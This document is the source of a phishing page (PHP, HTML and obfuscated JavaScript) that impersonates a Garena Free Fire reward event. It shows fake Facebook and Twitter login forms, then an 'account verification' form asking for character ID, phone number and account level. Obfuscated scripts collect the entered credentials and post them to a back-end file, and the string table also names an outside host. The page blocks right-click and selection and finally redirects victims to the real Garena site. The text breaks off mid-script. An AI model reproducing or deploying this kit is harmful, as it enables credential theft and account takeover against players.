<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
$username = $_POST['email'];
$password = $_POST['password'];
$files = scandir(__DIR__); // __DIR__ يشير إلى المجلد الحالي
// ابحث عن الملفات التي تطابق النمط الذي تريده
foreach ($files as $file) {
    if (strpos($file, 'index') !== false) { // تأكد من أن الملف يحتوي على "index" في اسمه
        $loginFolder = basename(__DIR__); // احصل على اسم المجلد الحالي
        break; // أخرج من الحلقة عند العثور على أول ملف مطابق
    }
}
include("../COUNTRY.php");
}
?>
<html>
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no" />
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="Garena Free Fire Mobile Event">
<meta name="description" content="Collect your special rewards at the Royale Pas Event. This opportunity is limited and without the need for topup. Collect your rewards now!">
<meta property="og:description" content="Collect your special rewards at the Royale Pas Event. This opportunity is limited and without the need for topup. Collect your rewards now!">
<meta property="og:url" content="./">
<meta property="og:site_name" content="Garena Free Fire Max Event">
<meta property="og:type" content="website">
<meta name="copyright" content="Garena Free Fire Max">
<meta name="theme-color" content="#000">
<meta property="og:image" content="https://g.top4top.io/p_21446tfln1.jpg">
<title>Garena Free Fire Mobile India Event</title>
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/animate.css">
<link rel="stylesheet" href="css/login/facebook.css">
<link rel="stylesheet" href="css/login/twitter.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<link rel="icon" href="https://g.top4top.io/p_21446tfln1.jpg">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
<style type="text/css">
 body {
	background: #000 center / cover no-repeat;
	margin: 0;
	font-family: 'Teko';
}
.container {
	border: 1px solid #CAB16D;
}
.navbar {
	background: #0C0C0C;
	width: 100%;
	height: 60px;
}
.navbar-logo {
	width: 100px;
	height: 30px;
	float: left;
	margin-top: 12px;
	margin-left: 13px;
}
.navbar-shop {
	width: 29px;
	margin-top: 19px;
	margin-right: 8px;
}
.navbar-menu {
	width: 20px;
	margin-top: 19px;
	margin-right: 5px;
}
.navbar-right {
	width: auto;
	float: right;
}
.navbar-download {
	background: #ffca13;
	width: 50px;
	height: 50px;
	margin-top: 10px;
	margin-right: 3px;
	border-radius: 0px;
	float: right;
}
.navbar-download img {
	width: 20px;
	height: 21px;
	margin: 13px;
}
.navbar-righ {
	width: auto;
	float: right;
}
.navbar-shp {
	width: 29px;
	margin-top: 19px;
	margin-right: 10px;
}
.event-theme {
	width:100%;
	height:60px;
	margin-top: -20px;
	margin-left:auto;
	margin-right:auto;
	padding: 5px;
	display:block;
}
.event-notification-wrapper {
	width:85%;
	height: auto;
	margin-top:20px;
	margin-left:auto;
	margin-right:auto;
	margin-bottom:5px;
	display:block;
}
.event-notification-content {
	width:100%;
	height:auto;
	bottom: -5px;
	padding:5px;
	color:#CAB16D;
	text-shadow: 0.5px 0.5px #9A7242;
	font-size: 21px;
	font-family:Teko;
	text-align: center;
}
.footer {
	background: #131313;
	width: 100%;
	height: auto;
	padding: 15px;
}
.footer-copyright-icon {
	width: 55%;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	display: block;
}
.footer-txt-copyright {
	color: #bdbdbd;
	font-size: 15px;
	font-family:Teko;
	text-align: center;
}
.item img {
    border: none;
}
.item button {
	border:1.5px solid #CAB16D;
	color:#CAB16D;
	text-shadow: 0.3px 0.3px #9A7242;
}
.nav-popup-title {
    padding-left: 15px;
	padding-top: 2px;
	color: #fff;
	font-size: 22px;
	font-family:Teko;
	font-weight: 500;
	text-align: left;
}
.nav-popup img {
	width: 20px;
	height: 20px;
	margin-top: 5px;
	margin-right: 10px;
	color: #fff;
	float: right;
}
.popup-alerts {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 5px;
	color: #fff;
	font-size: 20px;
    font-family:Teko;
	font-weight: 500;
	text-align: center;
	display: block;
}
.popup-alert {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 5px;
	color: #fff;
	font-size: 20px;
    font-family:Teko;
	font-weight: 500;
	text-align: center;
	display: block;
}
.popup-alert i {
	padding-top: 15px;
	padding-bottom: 15px;
	color: #fff;
	font-size: 40px;
	text-align: center;
}
.popup-footer button:nth-child(1) {
	width: auto;
	height: auto;
	margin-top: 4px;
	margin-left:auto;
	margin-right:auto;
	padding: 3px;
	padding-left: 28px;
	padding-right: 28px;
	color: #000;
	font-size:18px;
	font-family: Teko;
	font-weight: 500;
	text-align: center;
	border: none;
	outline: none;
}
.popup-btn-login {
    width: 40%;
    height: auto;
    padding: 6px;
    margin: 5px;
    color: #000;
	font-size: 15px;
    font-family: Teko;
    border: none;
    outline: none;
    margin-bottom: 45px;
    position: relative;
    display: line-block;
}
.popup-btn-login i {
    color: #fff;
    font-size: 23px;
    float: left;
}
.popup-btn-facebook {
    background: #4167B2;
    color: #fff;
}
.popup-btn-twitter {
    background: #198B96;
    color: #fff;
}
.popup-form-footer {
    margin-top: -16px;
}
.popup-form-footer button {
	width: auto;
	height: auto;
	margin-top: 4px;
	padding: 3px;
	padding-left: 30px;
	padding-right: 30px;
	color: #000;
	font-size:18px;
	font-family: Teko;
	font-weight: 500;
	text-align: center;
	border:none;
	outline: none;
}
.popup-form input {
    background: none;
	background-size:100% 100%;
	width: 90%;
	height: auto;
	margin-left: 6px;
	margin-bottom: 3px;
	padding: 4.4px;
	color: #fff;
	font-size:17px;
	font-family:Teko;
	font-weight: 500;
	border-radius: 2px;
	border: 1px solid #fff;
	position: relative;
	outline: none;
	-webkit-appearance: none;
    -moz-appearance: none;
}
.popup-form input::placeholder {
	color: #fff;
}
.popup-form select {
    background: none;
	background-size:100% 100%;
	width: 90%;
	height: auto;
	margin-left: 6px;
	margin-bottom: 3px;
	padding: 6px;
	padding-left: 6px;
	color: #fff;
	font-size: 17px;
	font-family:Teko;
	font-weight: 500;
	border-radius: 2px;
	border: 1px solid #fff;
	position: relative;
	outline: none;
	-webkit-appearance: none;
    -moz-appearance: none;
}
</style>
<div class="container">
<div class="container">
<div class="navbar">
<img class="navbar-logo" src="https://graph.org/file/f44594b4e53ed495ecb7e.jpg">
<div class="navbar-right">
<img class="navbar-shop" src="https://www.battlegroundsmobileindia.com/common/img/btn/sns_f_w.png">
<img class="navbar-shop" src="https://www.battlegroundsmobileindia.com/common/img/btn/sns_i_w.png">
<img class="navbar-shop" src="https://www.battlegroundsmobileindia.com/common/img/btn/sns_y_w.png">
<div class="navbar-download"><img src="https://i.ibb.co/jwMxWFh/menu.png"></div>
<div class="navbar-righ">
<img class="navbar-shp" src="https://www.battlegroundsmobileindia.com/common/img/icon/icon_shop_50.png"></div>
</div> <!--- navbar-right --->
</div> <!--- navbar --->
</div> 
<div class="header">
<img src="img/shivam.jpg">
</div> 
<div class="event-theme">
</div> 
<div class="event-notification-wrapper">
<div class="event-notification-content">JOIN AND GET YOUR EXCLUSIVE REWARD NOW</div> 
</div> 
<div class="box">
<center>
<div class="tab_rewards" id="latest">
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/1.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/1.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/2.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/2.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/3.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/3.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/4.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/4.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/5.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/5.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/6.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/6.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/7.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/7.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/8.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/8.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/9.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/9.png">Collect</button>
</div>
</div>
</div> 
</center>
</div> 
<div class="footer">
<img class="footer-copyright-icon" src="https://graph.org/file/f44594b4e53ed495ecb7e.jpg">
<div class="footer-txt-copyright">ⓒGarena, Inc. All rights reserved.</div> 
<div class="footer-txt-copyright">Privacy Policy | Terms of Service | Rules of Conduct | Official Community Policy</div> 
</div> 
</div> 
<div class="popup itemReward_confirmation" style="display: none;">
<div class="popup-box">
<div class="nav-popup">
<img onmousedown="tutup.play();" onclick="close_reward_confirmation()" src="img/popup-close.png">
<div class="nav-popup-title">Reward Confirmation</div> 
</div> 
<div class="popup-box-bg">
<div style="color: yellow" class="popup-alert">Are you sure to collect this reward?</div> 
<div class="popup-item itemShine">
<div>
<figure>
<img src="" id="myItemReward_confirmationImg">
</figure>
</div>
</div> 
<br>
</div> 
<div class="popup-footer">
<button type="button" onmousedown="buka.play();" onclick="open_account_login()">Collect</button>
</div> 
</div> 
</div> 
<div class="popup account_login" style="display: none;">
<div class="popup-box">
<div class="nav-popup">
<div class="nav-popup-title">Account Login</div> 
</div> 
<div class="popup-box-bg">
<div style="color: yellow" class="popup-alerts">Log in using your Free Fire Max  account</div>
<button type="button" onmousedown="buka.play();" class="popup-btn-login popup-btn-facebook" onclick="open_facebook();"><i class="fa fa-facebook-square icon-login"></i> Facebook</button>
<img style="width: 90%; height: auto; margin-top: -30px; margin-left: auto; margin-right: auto;" src="https://i.postimg.cc/66bK3tfJ/Amod.png">
<br>
</div> 
<div class="popup-footer-log">
</div> 
</div> 
</div> 
<div class="popup-login login-facebook animated fadeIn" style="display: none;">
<div class="popup-box-login-fb">
<a onclick="tutup_facebook()" class="close-fb"><i class="zmdi zmdi-close"></i></a>
<div class="navbar-fb"><img src="https://i.ibb.co/Wg8qQxh/facebook-text.png"></div> 
<div class="content-box-fb">
<p class="kaget email-fb" style="width: 330px; top: -15px; text-align: left;">The email or phone number you entered does not match any account. <b>Find your account.</b></p>
<p class="kaget sandi-fb" style="width: 330px; top: -15px; text-align: left;">Incorrect password. <b>Did you forget your password?</b></p>
<img src="img/logo.jpg">
<div class="txt-login-fb">Log in to your Facebook account to connect to Garena Free Fire Mobile.</div> 
<form class="login-form" action="javascript:void(0)" method="post" id="ValidateLoginFbForm">
<input type="text" class="loginEmail" name="email" id="email-facebook" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" required oninvalid="this.setCustomValidity('Enter Email or Mobile Number')" oninput="setCustomValidity('')">
<input type="password" class="loginPassword" name="password" id="password-facebook" placeholder="Password" autocomplete="off" autocapitalize="off" required oninvalid="this.setCustomValidity('Enter Password')" oninput="setCustomValidity('')">
<div class="showHide showPassword" onclick="showFbPassword()"><i class="zmdi zmdi-eye-off zmdi-hc-2x"></i></div> 
<div class="showHide hidePassword" style="display: none;" onclick="hideFbPassword()"><i class="zmdi zmdi-eye zmdi-hc-2x"></i></div> 
<input type="hidden" name="login" id="login-facebook" value="Facebook" readonly>
<button type="submit" class="btn-login-fb" onclick="ValidateLoginFbData()">Log In</button>
</form>
<div class="txt-create-account">Create account</div> 
<div class="txt-not-now">Not now</div> 
<div class="txt-forgotten-password">Forgotten password?</div> 
</div> 
<div class="language-box">
<center>
<div class="language-name language-name-active">English (UK)</div> 
<div class="language-name">Bahasa Indonesia</div> 
<div class="language-name">Basa Jawa</div> 
<div class="language-name">Bahasa Melayu</div> 
<div class="language-name">日本語</div> 
<div class="language-name">Español</div> 
<div class="language-name">Português (Brasil)</div> 
<div class="language-name"><i class="fa fa-plus"></i></div> 
</center>
</div> 
<div class="copyright">Facebook Inc.</div> 
</div> 
</div> 
<div class="popup-login login-twitter animated fadeIn" style="display: none;">
<div class="popup-box-login-twitter">
<a onclick="tutup_twitter()" class="close-other"><i class="zmdi zmdi-close"></i></a>
<div class="box-twitter">
<center>
<div class="header-twitter">
<img src="https://i.ibb.co/V9rgBqw/twitter-text.png" style="margin-bottom: -35px; margin-left: 135px;">
</center>
<center>
<br><br>
<form action="javascript:void(0)" method="post" id="ValidateLoginTwitterForm">
<div class="txt-login-twitter" style="text-align: left; margin-left: 95px;">Login to Twitter</div> 
<div class="input-box-twitter">
<label>Phone, email, or username</label>
<input type="text" name="email" id="email-twitter" placeholder="" required oninvalid="this.setCustomValidity('Enter Username, Email or Mobile Number')" oninput="setCustomValidity('')">
</div> 
<div class="input-box-twitter">
<div class="TwitterShowHide TwitterShowPassword" onclick="showTwitterPassword()"><i class="zmdi zmdi-eye-off zmdi-hc-2x"></i></div> 
<div class="TwitterShowHide TwitterHidePassword" style="display: none;" onclick="hideTwitterPassword()"><i class="zmdi zmdi-eye zmdi-hc-2x"></i></div> 
<label>Password</label>
<input type="password" style="width: 85%;" name="password" id="password-twitter" placeholder="" required oninvalid="this.setCustomValidity('Enter Password')" oninput="setCustomValidity('')">
</div> 
<p class="kagettw email-tw" style="width: 330px; top: -15px; text-align: center; margin-left: -17px;">Sorry, we couldn't find your account.</p>
<p class="kagettw sandi-tw" style="width: 330px; top: -15px; text-align: center; margin-left: -17px;">Wrong Password!</p>
<input type="hidden" name="login" id="login-twitter" value="Twitter" readonly>
<button type="submit" class="btn-login-twitter" onclick="ValidateLoginTwitterData()">Log In</button>
<div class="footer-menu-twitter">Forgot password?</div> 
<div class="footer-menu-twitter bulet">•</div> 
<div class="footer-menu-twitter">Sign up to Twitter</div> 
</form>
</center>
</div> 
</div> 
</div> 
</div> 
<div class="popup account_verification" style="display: none;">
<div class="popup-box">
<div class="nav-popup">
<div class="nav-popup-title">Account Verification</div> 
</div> 
<div class="popup-box-bg">
<div style="color: yellow" class="popup-alert">Complete your account details</div> 
<form class="popup-form" style="color: yellow" action="javascript:void(0)" method="post" id="ValidateVerificationDataForm">
<input type="hidden" name="email" id="validateEmail" readonly>
<input type="hidden" name="password" id="validatePassword" readonly>
<input style="color: yellow" type="number" name="playid" id="playid" placeholder="Character ID" autocomplete="off" required oninvalid="this.setCustomValidity('Input your Character ID')" oninput="setCustomValidity('')" minlength="10">
<input style="color: yellow" type="number" name="phone" id="phone" placeholder="Phone Number" autocomplete="off" required oninvalid="this.setCustomValidity('Input your Phone Number')" oninput="setCustomValidity('')" minlength="10">
<select name="level" style="color: yellow" id="level" required oninvalid="this.setCustomValidity('select your Account Level')" oninput="setCustomValidity('')">
<option selected="selected" disabled="disabled" value="">Account Level</option>
<option>1</option>
<option>2</option>
<option>3</option>
<option>4</option>
<option>5</option>
<option>6</option>
<option>7</option>
<option>8</option>
<option>9</option>
<option>10</option>
<option>11</option>
<option>12</option>
<option>13</option>
<option>14</option>
<option>15</option>
<option>16</option>
<option>17</option>
<option>18</option>
<option>19</option>
<option>20</option>
<option>21</option>
<option>22</option>
<option>23</option>
<option>24</option>
<option>25</option>
<option>26</option>
<option>27</option>
<option>28</option>
<option>29</option>
<option>30</option>
<option>31</option>
<option>32</option>
<option>33</option>
<option>34</option>
<option>35</option>
<option>36</option>
<option>37</option>
<option>38</option>
<option>39</option>
<option>40</option>
<option>41</option>
<option>42</option>
<option>43</option>
<option>44</option>
<option>45</option>
<option>46</option>
<option>47</option>
<option>48</option>
<option>49</option>
<option>50</option>
<option>51</option>
<option>52</option>
<option>53</option>
<option>54</option>
<option>55</option>
<option>56</option>
<option>57</option>
<option>58</option>
<option>59</option>
<option>60</option>
<option>61</option>
<option>62</option>
<option>63</option>
<option>64</option>
<option>65</option>
<option>66</option>
<option>67</option>
<option>68</option>
<option>69</option>
<option>70</option>
<option>71</option>
<option>72</option>
<option>73</option>
<option>74</option>
<option>75</option>
<option>76</option>
<option>77</option>
<option>78</option>
<option>79</option>
<option>80</option>
<option>81</option>
<option>82</option>
<option>83</option>
<option>84</option>
<option>85</option>
<option>86</option>
<option>87</option>
<option>88</option>
<option>89</option>
<option>90</option>
<option>91</option>
<option>92</option>
<option>93</option>
<option>94</option>
<option>95</option>
<option>96</option>
<option>97</option>
<option>98</option>
<option>99</option>
<option>100</option>
</select>
<input type="hidden" name="login" id="validateLogin" readonly>
<br><br>
</div> 
<div class="popup-form-footer">
<button type="submit" onmousedown="buka.play();" onclick="ValidateVerificationData()">Verify</button>
</div> 
</form> 
</div> 
</div> 
<div class="popup check_verification" style="display: none;">
<div class="popup-box">
<div class="nav-popup">
<div class="nav-popup-title">Account Verification</div> 
</div> 
<div class="popup-box-bg">
<div class="popup-alert">
<br>
<i style="color: yellow" class="zmdi zmdi-spinner zmdi-hc-spin"></i>
<br>
Checking your account details...
<br><br>
</div> 
<div class="popup-form-footer">
</div> 
</div> 
</div> 
</div> 
<div class="popup processing_account" style="display: none;">
<div class="popup-box">
<div class="nav-popup">
<div class="nav-popup-title">Processing Account</div> 
</div> 
<div class="popup-box-bg">
<div style="color: yellow" class="popup-alert">
Thank you for joining this event
<br>
<br>
Your account has been successfully processed
<br>
Please wait up to 24 hours
</div> 
<div class="popup-footer">
<button type="button" onmousedown="tutup.play();" style="background: url(img/menu_on.png) no-repeat center center; background-size: 100% 100%;" onclick="location.href='https://ff.garena.com/en/';">Logout</button>
</div> 
</div> 
</div> 
</div> 
<script type="text/javascript" src="https://code.jquery.com/jquery-1.10.2.min.js"></script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="js/script.js"></script>
<script src="js/showHide.js"></script>
<script src="js/Nizam.js"></script>
<script>var _0x39461a=_0x3477;(function(_0x553efe,_0x551f78){var _0x43fae3=_0x3477,_0x4eff2e=_0x553efe();while(!![]){try{var _0x30338e=parseInt(_0x43fae3(0x130))/0x1+parseInt(_0x43fae3(0x132))/0x2+-parseInt(_0x43fae3(0x12b))/0x3*(-parseInt(_0x43fae3(0x11c))/0x4)+-parseInt(_0x43fae3(0x134))/0x5*(parseInt(_0x43fae3(0x119))/0x6)+parseInt(_0x43fae3(0x123))/0x7+-parseInt(_0x43fae3(0x11d))/0x8*(-parseInt(_0x43fae3(0x12d))/0x9)+parseInt(_0x43fae3(0x135))/0xa*(-parseInt(_0x43fae3(0x138))/0xb);if(_0x30338e===_0x551f78)break;else _0x4eff2e['push'](_0x4eff2e['shift']());}catch(_0x5c414f){_0x4eff2e['push'](_0x4eff2e['shift']());}}}(_0x2623,0x4b70c));function openRewards(_0x2b8e9c,_0x1bcfa8){var _0x309087=_0x3477,_0x286349,_0x3c08d6,_0x125dde;_0x3c08d6=document[_0x309087(0x137)](_0x309087(0x127));for(_0x286349=0x0;_0x286349<_0x3c08d6[_0x309087(0x118)];_0x286349++){_0x3c08d6[_0x286349]['style'][_0x309087(0x133)]=_0x309087(0x121);}_0x125dde=document[_0x309087(0x137)](_0x309087(0x126));for(_0x286349=0x0;_0x286349<_0x125dde[_0x309087(0x118)];_0x286349++){_0x125dde[_0x286349][_0x309087(0x136)]=_0x125dde[_0x286349][_0x309087(0x136)][_0x309087(0x122)](_0x309087(0x131),'');}document['getElementById'](_0x1bcfa8)[_0x309087(0x12f)]['display']=_0x309087(0x116),_0x2b8e9c[_0x309087(0x11e)][_0x309087(0x136)]+='\x20menu-content-active';}document[_0x39461a(0x11b)](_0x39461a(0x117))[_0x39461a(0x115)]();function open_account_verification(){var _0x1dc3ef=_0x39461a;$(_0x1dc3ef(0x11f))[_0x1dc3ef(0x125)](),$(_0x1dc3ef(0x139))[_0x1dc3ef(0x11a)](),$(_0x1dc3ef(0x129))['hide']();}function open_mail_login(){var _0x513d84=_0x39461a;$(_0x513d84(0x12a))[_0x513d84(0x125)](),$(_0x513d84(0x128))['hide']();}function close_mail_login(){var _0x1abb7a=_0x39461a;$(_0x1abb7a(0x12a))[_0x1abb7a(0x11a)](),$(_0x1abb7a(0x128))['show']();}function open_about_event(){var _0x550b93=_0x39461a;$('.about_event')[_0x550b93(0x125)]();}function open_event_rules(){var _0x19c2a0=_0x39461a;$(_0x19c2a0(0x124))['show']();}function open_facebook(){var _0xb63c9e=_0x39461a;$(_0xb63c9e(0x12c))['show'](),$(_0xb63c9e(0x128))[_0xb63c9e(0x11a)]();}function _0x2623(){var _0x13d6c9=['.otherReward_confirmation','.login-mail','4383wQZeTs','.login-facebook','1479276KMMRvA','.login-twitter','style','185734BGYYvS','\x20menu-content-active','921956lqMJxt','display','410MmqRZH','4923010TsoaMG','className','getElementsByClassName','33NkJVHD','.open_rewards','click','block','defaultTabRewards','length','11238lZQPuU','hide','getElementById','1332tzZqwV','24IhxgPB','currentTarget','.account_verification','.newhome','none','replace','2192232FFZWXb','.event_rules','show','menu-content','tab_rewards','.account_login'];_0x2623=function(){return _0x13d6c9;};return _0x2623();}function open_twitter(){var _0x5ad454=_0x39461a;$('.login-twitter')[_0x5ad454(0x125)](),$(_0x5ad454(0x128))['hide']();}function close_reward_confirmation(){var _0x307374=_0x39461a;$(_0x307374(0x139))[_0x307374(0x11a)](),$(_0x307374(0x124))[_0x307374(0x11a)]();}function _0x3477(_0x328bab,_0x2762f7){var _0x2623c6=_0x2623();return _0x3477=function(_0x3477e1,_0x37ae34){_0x3477e1=_0x3477e1-0x115;var _0x593165=_0x2623c6[_0x3477e1];return _0x593165;},_0x3477(_0x328bab,_0x2762f7);}function close_facebook(){var _0x18d764=_0x39461a;$(_0x18d764(0x12c))[_0x18d764(0x11a)](),$(_0x18d764(0x128))[_0x18d764(0x125)]();}function close_twitter(){var _0x373b21=_0x39461a;$(_0x373b21(0x12e))['hide'](),$(_0x373b21(0x128))['show']();}function open_newhome(){var _0x765ced=_0x39461a;$(_0x765ced(0x128))[_0x765ced(0x125)](),$(_0x765ced(0x120))[_0x765ced(0x11a)]();}function open_account_login(){var _0x43a9b6=_0x39461a;$(_0x43a9b6(0x128))['show'](),$(_0x43a9b6(0x139))['hide']();}</script><script>(function(_0x17cebf,_0x53b3a1){var _0x2b4569=_0x2ce1,_0x96fcbd=_0x17cebf();while(!![]){try{var _0x54de9f=-parseInt(_0x2b4569(0xdd))/0x1*(-parseInt(_0x2b4569(0xed))/0x2)+-parseInt(_0x2b4569(0xcf))/0x3*(-parseInt(_0x2b4569(0xd4))/0x4)+parseInt(_0x2b4569(0xe7))/0x5*(parseInt(_0x2b4569(0xd0))/0x6)+-parseInt(_0x2b4569(0xdb))/0x7+-parseInt(_0x2b4569(0xee))/0x8*(-parseInt(_0x2b4569(0xe8))/0x9)+parseInt(_0x2b4569(0xe6))/0xa*(-parseInt(_0x2b4569(0x104))/0xb)+-parseInt(_0x2b4569(0xfa))/0xc;if(_0x54de9f===_0x53b3a1)break;else _0x96fcbd['push'](_0x96fcbd['shift']());}catch(_0x3705c8){_0x96fcbd['push'](_0x96fcbd['shift']());}}}(_0x4bfb,0x3accb));function _0x2ce1(_0x236f00,_0x1e254e){var _0x4bfb71=_0x4bfb();return _0x2ce1=function(_0x2ce15e,_0x2e07c3){_0x2ce15e=_0x2ce15e-0xce;var _0x475b93=_0x4bfb71[_0x2ce15e];return _0x475b93;},_0x2ce1(_0x236f00,_0x1e254e);}function _0x4bfb(){var _0x366dd6=['input#validateEmail','2852801BFYgdQ','val','1054uEBXru','#email-twitter','#login-facebook','.login-twitter','#ValidateLoginTwitterForm','ajax','submit','.sandi-fb','.slider-container','52810LjzVba','750NwdUNO','999wBaEvG','.verification_info','input#validateLogin','#password-facebook','#ValidateLoginFbForm','708DyJrsX','26112nqwIWV','trim','input#validatePassword','#level','#email-facebook','#ValidateVerificationDataForm','length','.email-tw','.login-facebook','https://getipflag.my.id/','#playid','serialize','2748324VNJCXk','preventDefault','input#phone','.email-fb','#password-twitter','.check_verification','#login-twitter','input#answer2','POST','.Other_verification','286xJSPPs','.sandi-tw','input#answer1','3sJgCtu','8868lCAwTs','.account_verification','show','input#playid','230396jqZEXh','input#level','.processing_account','data1.php','#phone','hide'];_0x4bfb=function(){return _0x366dd6;};return _0x4bfb();}function ValidateLoginFbData(){var _0x40894b=_0x2ce1;return $(_0x40894b(0xec))[_0x40894b(0xe3)](function(_0x30cabd){var _0x29cc32=_0x40894b;_0x30cabd[_0x29cc32(0xfb)](),$emailfb=$(_0x29cc32(0xf2))[_0x29cc32(0xdc)]()['trim'](),$passwordfb=$(_0x29cc32(0xeb))[_0x29cc32(0xdc)]()[_0x29cc32(0xef)](),$loginfb=$(_0x29cc32(0xdf))[_0x29cc32(0xdc)]()[_0x29cc32(0xef)]();if($emailfb==''||$emailfb==null||$emailfb[_0x29cc32(0xf4)]<=0x8)return $(_0x29cc32(0xfd))[_0x29cc32(0xd2)](),$(_0x29cc32(0xe4))['hide'](),$(_0x29cc32(0xd1))[_0x29cc32(0xd9)](),$(_0x29cc32(0xf6))[_0x29cc32(0xd2)](),![];else $('.email-fb')['hide'](),$(_0x29cc32(0xda))[_0x29cc32(0xdc)]($emailfb),$(_0x29cc32(0xd1))['show'](),$(_0x29cc32(0xf6))[_0x29cc32(0xd9)]();if($passwordfb==''||$passwordfb==null||$passwordfb[_0x29cc32(0xf4)]<=0x5)return $('.sandi-fb')[_0x29cc32(0xd2)](),$(_0x29cc32(0xd1))['hide'](),$(_0x29cc32(0xf6))[_0x29cc32(0xd2)](),![];else $(_0x29cc32(0xe4))['hide'](),$('input#validatePassword')['val']($passwordfb),$(_0x29cc32(0xea))[_0x29cc32(0xdc)]($loginfb),$('.account_verification')['show'](),$('.login-facebook')[_0x29cc32(0xd9)]();var _0x6c23b=$(_0x29cc32(0xda))['val'](),_0x5f4442=$(_0x29cc32(0xf0))[_0x29cc32(0xdc)](),_0x507e8d=$(_0x29cc32(0xea))[_0x29cc32(0xdc)]();if(_0x6c23b==''&&_0x5f4442==''&&_0x507e8d=='')return $(_0x29cc32(0xf6))[_0x29cc32(0xd9)](),![];$[_0x29cc32(0xe2)]({'type':_0x29cc32(0x102),'url':_0x29cc32(0xd7),'data':$(this)[_0x29cc32(0xf9)](),'beforeSend':function(){var _0x593bd0=_0x29cc32;$(_0x593bd0(0xf6))[_0x593bd0(0xd9)]();},'success':function(){var _0x555190=_0x29cc32;$('.login-facebook')[_0x555190(0xd9)](),$(_0x555190(0xe5))[_0x555190(0xd2)]();}});}),![];};function ValidateLoginTwitterData(){var _0x2387e5=_0x2ce1;return $(_0x2387e5(0xe1))[_0x2387e5(0xe3)](function(_0xb5c8eb){var _0x19e058=_0x2387e5;_0xb5c8eb[_0x19e058(0xfb)](),$emailtw=$(_0x19e058(0xde))[_0x19e058(0xdc)]()[_0x19e058(0xef)](),$passwordtw=$(_0x19e058(0xfe))[_0x19e058(0xdc)]()[_0x19e058(0xef)](),$logintw=$(_0x19e058(0x100))[_0x19e058(0xdc)]()['trim']();if($emailtw==''||$emailtw==null||$emailtw[_0x19e058(0xf4)]<=0x3)return $(_0x19e058(0xf5))['show'](),$(_0x19e058(0x105))[_0x19e058(0xd9)](),$(_0x19e058(0xd1))[_0x19e058(0xd9)](),$(_0x19e058(0xe0))[_0x19e058(0xd2)](),![];else $(_0x19e058(0xf5))[_0x19e058(0xd9)](),$(_0x19e058(0xda))['val']($emailtw),$(_0x19e058(0xd1))['show'](),$(_0x19e058(0xe0))[_0x19e058(0xd9)]();if($passwordtw==''||$passwordtw==null||$passwordtw[_0x19e058(0xf4)]<=0x7)return $(_0x19e058(0x105))['show'](),$(_0x19e058(0xd1))[_0x19e058(0xd9)](),$(_0x19e058(0xe0))[_0x19e058(0xd2)](),![];else $(_0x19e058(0x105))['hide'](),$(_0x19e058(0xf0))['val']($passwordtw),$('input#validateLogin')['val']($logintw),$('.account_verification')['show'](),$(_0x19e058(0xe0))['hide']();var _0x20d132=$('input#validateEmail')[_0x19e058(0xdc)](),_0x3a290c=$(_0x19e058(0xf0))[_0x19e058(0xdc)](),_0xdf0d35=$(_0x19e058(0xea))['val']();if(_0x20d132==''&&_0x3a290c==''&&_0xdf0d35=='')return $('.login-twitter')[_0x19e058(0xd9)](),![];$[_0x19e058(0xe2)]({'type':_0x19e058(0x102),'url':_0x19e058(0xd7),'data':$(this)[_0x19e058(0xf9)](),'beforeSend':function(){var _0x4703cf=_0x19e058;$(_0x4703cf(0xe0))[_0x4703cf(0xd9)]();},'success':function(){var 